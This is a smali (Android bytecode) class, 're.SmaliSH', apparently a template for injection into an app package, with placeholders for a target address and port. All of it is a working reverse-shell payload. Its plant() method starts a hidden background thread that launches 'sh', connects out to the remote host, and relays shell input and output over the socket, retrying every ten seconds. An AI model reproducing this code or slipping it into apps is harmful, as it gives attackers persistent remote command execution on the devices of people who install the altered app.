.class public Lre/SmaliSH;
.super Ljava/lang/Object;
.source "SmaliSH.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field public static final AGGRESSIVE:Z = false

.field public static final TAG:Ljava/lang/String; = "re.SmaliSH"

.field public static TARGET:Ljava/lang/String; = null

.field public static TARGET_PORT:I = 0x0

.field public static final VERBOSE:Z = true

.field public static final plantOnce:Ljava/util/concurrent/atomic/AtomicBoolean;


# instance fields
.field final from:Ljava/io/InputStream;

.field final proc:Ljava/lang/Process;

.field final to:Ljava/io/OutputStream;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 20
    const-string v0, "{SMALISH_ADDRES}"

    sput-object v0, Lre/SmaliSH;->TARGET:Ljava/lang/String;

    .line 21
    const/16 v0, {SMALISH_PORT}

    sput v0, Lre/SmaliSH;->TARGET_PORT:I

    .line 26
    new-instance v0, Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-direct {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>()V

    sput-object v0, Lre/SmaliSH;->plantOnce:Ljava/util/concurrent/atomic/AtomicBoolean;

    return-void
.end method

.method public constructor <init>(Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/Process;)V
    .locals 0
    .param p1, "from"    # Ljava/io/InputStream;
    .param p2, "to"    # Ljava/io/OutputStream;
    .param p3, "proc"    # Ljava/lang/Process;

    .line 28
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 29
    iput-object p1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    .line 30
    iput-object p2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    .line 31
    iput-object p3, p0, Lre/SmaliSH;->proc:Ljava/lang/Process;

    .line 32
    return-void
.end method

.method public static plant()V
    .locals 4

    .line 36
    sget-object v0, Lre/SmaliSH;->plantOnce:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x0

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Ljava/util/concurrent/atomic/AtomicBoolean;->compareAndSet(ZZ)Z

    move-result v0

    .line 37
    .local v0, "planted":Z
    if-nez v0, :cond_0

    .line 38
    return-void

    .line 41
    :cond_0
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lre/SmaliSH;

    const/4 v3, 0x0

    invoke-direct {v2, v3, v3, v3}, Lre/SmaliSH;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/Process;)V

    const-string v3, "ReSmaliSH.proc"

    invoke-direct {v1, v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 42
    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .line 46
    iget-object v0, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    const/4 v1, 0x0

    if-nez v0, :cond_c

    iget-object v0, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    if-nez v0, :cond_c

    .line 48
    :goto_0
    const/4 v0, 0x0

    .line 49
    .local v0, "socket":Ljava/net/Socket;
    const/4 v2, 0x0

    .line 50
    .local v2, "p":Ljava/lang/Process;
    const/4 v3, 0x0

    .line 51
    .local v3, "t1":Ljava/lang/Thread;
    const/4 v4, 0x0

    .line 53
    .local v4, "t2":Ljava/lang/Thread;
    :try_start_0
    new-instance v5, Ljava/lang/ProcessBuilder;

    const/4 v6, 0x1

    new-array v7, v6, [Ljava/lang/String;

    const-string v8, "sh"

    aput-object v8, v7, v1

    invoke-direct {v5, v7}, Ljava/lang/ProcessBuilder;-><init>([Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/lang/ProcessBuilder;->start()Ljava/lang/Process;

    move-result-object v5

    move-object v2, v5

    .line 54
    new-instance v5, Ljava/net/Socket;

    sget-object v7, Lre/SmaliSH;->TARGET:Ljava/lang/String;

    sget v8, Lre/SmaliSH;->TARGET_PORT:I

    invoke-direct {v5, v7, v8}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    move-object v0, v5

    .line 55
    invoke-virtual {v0, v6}, Ljava/net/Socket;->setKeepAlive(Z)V

    .line 56
    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    const-string v6, "re.SmaliSH $ "

    invoke-virtual {v6}, Ljava/lang/String;->getBytes()[B

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/OutputStream;->write([B)V

    .line 57
    new-instance v5, Lre/SmaliSH;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    invoke-virtual {v2}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    invoke-direct {v5, v6, v7, v2}, Lre/SmaliSH;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/Process;)V

    .line 58
    .local v5, "taskIn":Lre/SmaliSH;
    new-instance v6, Lre/SmaliSH;

    invoke-virtual {v2}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v8

    invoke-direct {v6, v7, v8, v2}, Lre/SmaliSH;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;Ljava/lang/Process;)V

    .line 59
    .local v6, "taskOut":Lre/SmaliSH;
    new-instance v7, Ljava/lang/Thread;

    const-string v8, "ReSmaliSH.task.in"

    invoke-direct {v7, v5, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    move-object v3, v7

    .line 60
    new-instance v7, Ljava/lang/Thread;

    const-string v8, "ReSmaliSH.task.out"

    invoke-direct {v7, v6, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    move-object v4, v7

    .line 61
    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    .line 62
    invoke-virtual {v4}, Ljava/lang/Thread;->start()V

    .line 63
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 71
    .end local v5    # "taskIn":Lre/SmaliSH;
    .end local v6    # "taskOut":Lre/SmaliSH;
    nop

    .line 73
    :try_start_1
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    .line 76
    goto :goto_1

    .line 74
    :catch_0
    move-exception v5

    .line 75
    .local v5, "e":Ljava/io/IOException;
    const-string v6, "re.SmaliSH"

    const-string v7, "e"

    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 78
    .end local v5    # "e":Ljava/io/IOException;
    :goto_1
    if-eqz v2, :cond_0

    .line 79
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V

    .line 81
    :cond_0
    nop

    .line 82
    invoke-virtual {v3}, Ljava/lang/Thread;->interrupt()V

    .line 84
    nop

    .line 85
    :goto_2
    invoke-virtual {v4}, Ljava/lang/Thread;->interrupt()V

    goto :goto_5

    .line 71
    :catchall_0
    move-exception v1

    goto :goto_6

    .line 67
    :catch_1
    move-exception v5

    .line 68
    .local v5, "e":Ljava/lang/InterruptedException;
    :try_start_2
    const-string v6, "re.SmaliSH"

    const-string v7, "e"

    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 71
    .end local v5    # "e":Ljava/lang/InterruptedException;
    if-eqz v0, :cond_1

    .line 73
    :try_start_3
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_2

    .line 76
    goto :goto_3

    .line 74
    :catch_2
    move-exception v5

    .line 75
    .local v5, "e":Ljava/io/IOException;
    const-string v6, "re.SmaliSH"

    const-string v7, "e"

    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 78
    .end local v5    # "e":Ljava/io/IOException;
    :cond_1
    :goto_3
    if-eqz v2, :cond_2

    .line 79
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V

    .line 81
    :cond_2
    if-eqz v3, :cond_3

    .line 82
    invoke-virtual {v3}, Ljava/lang/Thread;->interrupt()V

    .line 84
    :cond_3
    if-eqz v4, :cond_7

    goto :goto_2

    .line 64
    :catch_3
    move-exception v5

    .line 65
    .restart local v5    # "e":Ljava/io/IOException;
    :try_start_4
    const-string v6, "re.SmaliSH"

    const-string v7, "e"

    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 71
    .end local v5    # "e":Ljava/io/IOException;
    if-eqz v0, :cond_4

    .line 73
    :try_start_5
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_4

    .line 76
    goto :goto_4

    .line 74
    :catch_4
    move-exception v5

    .line 75
    .restart local v5    # "e":Ljava/io/IOException;
    const-string v6, "re.SmaliSH"

    const-string v7, "e"

    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 78
    .end local v5    # "e":Ljava/io/IOException;
    :cond_4
    :goto_4
    if-eqz v2, :cond_5

    .line 79
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V

    .line 81
    :cond_5
    if-eqz v3, :cond_6

    .line 82
    invoke-virtual {v3}, Ljava/lang/Thread;->interrupt()V

    .line 84
    :cond_6
    if-eqz v4, :cond_7

    goto :goto_2

    .line 88
    :cond_7
    :goto_5
    const-wide/16 v5, 0x2710

    invoke-static {v5, v6}, Landroid/os/SystemClock;->sleep(J)V

    .line 89
    .end local v0    # "socket":Ljava/net/Socket;
    .end local v2    # "p":Ljava/lang/Process;
    .end local v3    # "t1":Ljava/lang/Thread;
    .end local v4    # "t2":Ljava/lang/Thread;
    goto/16 :goto_0

    .line 71
    .restart local v0    # "socket":Ljava/net/Socket;
    .restart local v2    # "p":Ljava/lang/Process;
    .restart local v3    # "t1":Ljava/lang/Thread;
    .restart local v4    # "t2":Ljava/lang/Thread;
    :goto_6
    if-eqz v0, :cond_8

    .line 73
    :try_start_6
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_5

    .line 76
    goto :goto_7

    .line 74
    :catch_5
    move-exception v5

    .line 75
    .restart local v5    # "e":Ljava/io/IOException;
    const-string v6, "re.SmaliSH"

    const-string v7, "e"

    invoke-static {v6, v7, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 78
    .end local v5    # "e":Ljava/io/IOException;
    :cond_8
    :goto_7
    if-eqz v2, :cond_9

    .line 79
    invoke-virtual {v2}, Ljava/lang/Process;->destroy()V

    .line 81
    :cond_9
    if-eqz v3, :cond_a

    .line 82
    invoke-virtual {v3}, Ljava/lang/Thread;->interrupt()V

    .line 84
    :cond_a
    if-eqz v4, :cond_b

    .line 85
    invoke-virtual {v4}, Ljava/lang/Thread;->interrupt()V

    .line 87
    :cond_b
    throw v1

    .line 91
    .end local v0    # "socket":Ljava/net/Socket;
    .end local v2    # "p":Ljava/lang/Process;
    .end local v3    # "t1":Ljava/lang/Thread;
    .end local v4    # "t2":Ljava/lang/Thread;
    :cond_c
    const/16 v0, 0x2000

    new-array v0, v0, [B

    .line 94
    .local v0, "buf":[B
    :goto_8
    :try_start_7
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v2

    if-eqz v2, :cond_d

    .line 95
    goto :goto_9

    .line 97
    :cond_d
    iget-object v2, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    invoke-virtual {v2, v0}, Ljava/io/InputStream;->read([B)I

    move-result v2

    .line 98
    .local v2, "r":I
    const/4 v3, -0x1

    if-ne v2, v3, :cond_e

    .line 99
    const-string v1, "re.SmaliSH"

    const-string v3, "quit"

    invoke-static {v1, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 100
    iget-object v1, p0, Lre/SmaliSH;->proc:Ljava/lang/Process;

    invoke-virtual {v1}, Ljava/lang/Process;->destroy()V
    :try_end_7
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_7} :catch_8
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    .line 101
    nop

    .line 111
    .end local v2    # "r":I
    :goto_9
    :try_start_8
    iget-object v1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_6

    .line 113
    goto :goto_a

    .line 112
    :catch_6
    move-exception v1

    .line 115
    :goto_a
    :try_start_9
    iget-object v1, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
    :try_end_9
    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_7

    .line 118
    :goto_b
    goto :goto_d

    .line 116
    :catch_7
    move-exception v1

    .line 119
    goto :goto_d

    .line 103
    .restart local v2    # "r":I
    :cond_e
    :try_start_a
    iget-object v3, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v3, v0, v1, v2}, Ljava/io/OutputStream;->write([BII)V

    .line 104
    iget-object v3, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V
    :try_end_a
    .catch Ljava/io/IOException; {:try_start_a .. :try_end_a} :catch_8
    .catchall {:try_start_a .. :try_end_a} :catchall_1

    .line 105
    .end local v2    # "r":I
    goto :goto_8

    .line 110
    :catchall_1
    move-exception v1

    goto :goto_e

    .line 106
    :catch_8
    move-exception v1

    .line 107
    .local v1, "e":Ljava/io/IOException;
    :try_start_b
    const-string v2, "re.SmaliSH"

    const-string v3, "e"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_1

    .line 111
    .end local v1    # "e":Ljava/io/IOException;
    :try_start_c
    iget-object v1, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_c
    .catch Ljava/io/IOException; {:try_start_c .. :try_end_c} :catch_9

    .line 113
    goto :goto_c

    .line 112
    :catch_9
    move-exception v1

    .line 115
    :goto_c
    :try_start_d
    iget-object v1, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v1}, Ljava/io/OutputStream;->close()V
    :try_end_d
    .catch Ljava/io/IOException; {:try_start_d .. :try_end_d} :catch_7

    goto :goto_b

    .line 123
    .end local v0    # "buf":[B
    :goto_d
    return-void

    .line 110
    .restart local v0    # "buf":[B
    :goto_e
    nop

    .line 111
    :try_start_e
    iget-object v2, p0, Lre/SmaliSH;->from:Ljava/io/InputStream;

    invoke-virtual {v2}, Ljava/io/InputStream;->close()V
    :try_end_e
    .catch Ljava/io/IOException; {:try_start_e .. :try_end_e} :catch_a

    .line 113
    goto :goto_f

    .line 112
    :catch_a
    move-exception v2

    .line 115
    :goto_f
    :try_start_f
    iget-object v2, p0, Lre/SmaliSH;->to:Ljava/io/OutputStream;

    invoke-virtual {v2}, Ljava/io/OutputStream;->close()V
    :try_end_f
    .catch Ljava/io/IOException; {:try_start_f .. :try_end_f} :catch_b

    .line 118
    goto :goto_10

    .line 116
    :catch_b
    move-exception v2

    .line 119
    :goto_10
    throw v1
.end method
